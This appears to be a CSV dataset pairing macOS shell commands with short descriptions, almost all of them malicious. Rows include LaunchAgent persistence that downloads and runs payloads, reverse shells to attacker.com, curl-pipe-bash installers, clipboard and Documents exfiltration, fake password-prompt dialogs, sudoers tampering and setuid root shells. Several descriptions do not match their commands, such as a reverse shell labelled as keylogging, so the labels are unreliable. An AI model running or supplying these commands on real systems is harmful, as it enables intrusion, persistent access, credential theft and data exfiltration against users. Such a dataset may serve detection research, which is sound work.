"cmd","description"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.agent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/payload</string><string>-o</string><string>/tmp/payload</string><string>&&</string><string>chmod</string><string>+x</string><string>/tmp/payload</string><string>&&</string><string>/tmp/payload</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious Launch Agent"
"curl -s http://example.com/malicious/install.sh | /bin/bash","Malware installation using a disguised script downloaded from the internet."
"osascript -e 'tell app ""System Events"" to display dialog ""A critical software update is available. Please enter your password to continue:"" default answer """" with hidden answer with icon 2'","Phishing attack script that masquerades as a legitimate software update."
"python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((""attacker.com"", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([""/bin/sh"",""-i""]);'","Keylogging script that captures keystrokes and sends them to a remote server."
"screencapture -x ~/screenshot.png && curl -T ~/screenshot.png ftp://attacker.com --user username:password","Screen capture command that silently takes screenshots and uploads them to a remote server."
"while read -r line; do screencapture -x ~/Desktop/screenshot_$(date +%Y%m%d%H%M%S).png; done < <(log stream --predicate 'eventMessage contains ""KeyDown""')","Capturing keystrokes and taking screenshots on a macOS system whenever a specific key is pressed."
"echo 'Defaults timestamp_timeout=0' >> /etc/sudoers && echo 'Defaults !tty_tickets' >> /etc/sudoers && sudo -k && sudo malicious_script.sh","Persistent execution of a malicious script by exploiting sudo misconfigurations and timestamp spoofing to bypass tty_tickets."
"curl -s http://malicious-url.com/fakeUpdate.sh | /bin/bash","Malware installation through a disguised Bash script that masquerades as a software update."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persist.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persist.plist","Persistence via malicious plist file to maintain access to a macOS system."
"curl -s http://malicious-url.com/phishing_kit.zip -o ~/Downloads/phishing_kit.zip && unzip ~/Downloads/phishing_kit.zip -d ~/Sites/spoofed_pages && cd ~/Sites/spoofed_pages && python -m SimpleHTTPServer 8080","Downloading a phishing toolkit from a remote server to create spoofed login pages for credential harvesting."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist file to establish a reverse shell."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item by adding a malicious application to the user's login items."
"osascript -e 'repeat every 300 seconds' -e 'do shell script ""screencapture ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png""' -e 'end repeat' | crontab -","Scheduled screen capture using AppleScript to exfiltrate data from a macOS system."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a cron job that downloads and executes a script every hour."
"echo ""while true; do log stream --predicate 'eventMessage contains ""authentication""' >> /tmp/auth_events.log; sleep 60; done &"" >> ~/.zshrc && source ~/.zshrc","Persistent monitoring of user authentication events on macOS."
"echo '* * * * * root /path/to/rootkit' >> /etc/crontab","Privilege escalation by exploiting cron jobs to schedule rootkit execution."
"DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp","Injecting malicious shared objects into system processes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.hidden.keylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/keylogger</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>KeepAlive</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.hidden.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.hidden.keylogger.plist","Persistence via keylogger installation using a hidden Launch Agent."
"while true; do screencapture -x ~/Desktop/screenshot_$(date '+%Y-%m-%d_%H-%M-%S').png; sleep 300; done","Screen activity recording using built-in screencapture utility."
"while true; do pbpaste | curl -d @- http://malicious-server.com/clipboard_upload; sleep 60; done","Clipboard monitoring and exfiltration to a remote server."
"openssl enc -aes-256-cbc -salt -in /path/to/confidential/document -out /tmp/encrypted_document.enc -pass pass:SecretPassword && curl --url 'smtp://malicious-smtp-server.com:25' --ssl-reqd --mail-from 'attacker@example.com' --mail-rcpt 'recipient@example.com' --upload-file /tmp/encrypted_document.enc --user 'username:password'","Exfiltrating confidential documents from a macOS system by sending them via email using a malicious SMTP server configuration."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://attacker.com/malware.sh | /bin/sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist to maintain remote access."
"echo '@reboot /path/to/malware' >> ~/Library/LaunchAgents/crontab","A scenario where malware is set to launch at every system reboot using cron jobs."
"echo ""* * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash"" | crontab -","Persistence via a malicious script added to cron.d on a macOS system."
"echo 'alias ssh=""ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no""' >> ~/.bash_profile && source ~/.bash_profile","Persistence via SSH agent hijacking on a macOS system."
"curl -s http://example.com/malicious-script.sh > /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh","Malware installation using a disguised curl command to download and execute a script."
"osascript -e 'Tell application ""System Events"" to display dialog ""System Update Required"" & linefeed & ""Please enter your password:"" default answer """" with hidden answer with icon 1'","Phishing attack script that masquerades as a system update to trick users into entering their credentials."
"echo 'script -q /dev/null | tee ~/Library/Logs/keystroke.log' >> ~/.bash_profile","Credential interception by appending a command to the .bash_profile to capture keystrokes."
"osascript -e 'Tell application ""System Events"" to display dialog ""Authentication Required"" & linefeed & ""Please enter your password:"" default answer """" with hidden answer with title ""Authentication""'","Creation of a fake authentication pop-up to steal user credentials."
"cp /bin/sh /tmp/rootsh && chmod 4777 /tmp/rootsh","Privilege escalation by exploiting a vulnerable setuid application to gain root access."
"chmod a+x /path/to/script.sh","Changing file permissions to make a script world-executable."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistent execution of an unauthorized script via a modified launch agent."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to allow an attacker to remotely access the system."
"tar -czf - ~/Documents | nc -w 3 attacker.com 5555","Exfiltrating the contents of the user's Documents directory to a remote server."
"ssh -L 5900:localhost:5900 user@remote-server.com -N","Setting up port forwarding to redirect local port 5900 to a remote server's port 5900."
"*/10 * * * * screencapture -x ~/Library/Caches/screenshot.jpg; logkeys --start --output ~/Library/Caches/keystroke.log; curl -F 'file=@/Users/$(whoami)/Library/Caches/screenshot.jpg' http://malicious-server.com/upload; curl -F 'file=@/Users/$(whoami)/Library/Caches/keystroke.log' http://malicious-server.com/upload","Persistence via screen capture automation and keylogging integration with periodic screenshot upload to a remote server."
"curl -s http://compromised-website.com/malicious-install.sh | sh","Malware installation through a drive-by download initiated by visiting a compromised website that leads to a phishing redirect."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/rootkit</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Embedding a rootkit to maintain boot persistence using a launch agent on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to establish a backdoor for remote access."
"while true; do screencapture -x ~/Library/Caches/$(date +%s).png; sleep 300; done","Monitoring user activity by capturing screenshots periodically."
"while true; do pbpaste | curl -d @- http://malicious-url.com/clipboard_upload; sleep 10; done","Clipboard monitoring to exfiltrate data to a remote server."
"open malicious_script.zip && osascript malicious_script.scpt","Malware installation through the execution of a script received via an email attachment."
"curl -s http://phishing-link.com/payload.sh | sh","Executing a malicious payload that was delivered through a phishing email link."
"osascript -e 'display dialog ""Critical Update Required"" buttons {""Update"", ""Cancel""} default button 1' && curl -s http://fake-update.com/update.pkg > /tmp/update.pkg && installer -pkg /tmp/update.pkg -target /","Fake security alert prompting the user to install a malicious system update."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via scripting additions that execute every time the user logs in."
"curl -s http://malicious-url.com/rootkit.tar.gz | tar xz -C / && cd /rootkit_directory && make && make install","Embedding a rootkit to maintain unauthorized access to a macOS system."
"echo 'dtrace -n ""fbt:::entry { @[ustack()] = count(); }"" -o /dev/null' | sudo sh","Tampering with the network stack to intercept or manipulate network traffic on a macOS device."
"nc -zv remote-host-ip 1-65535","Performing a port scan from a macOS system to find open ports on a remote host."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist file to maintain access to a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to maintain access to a macOS system."
"chmod +s /bin/bash","Privilege escalation by manipulating file permissions to grant executable rights to unauthorized files using setfacl command misuse."
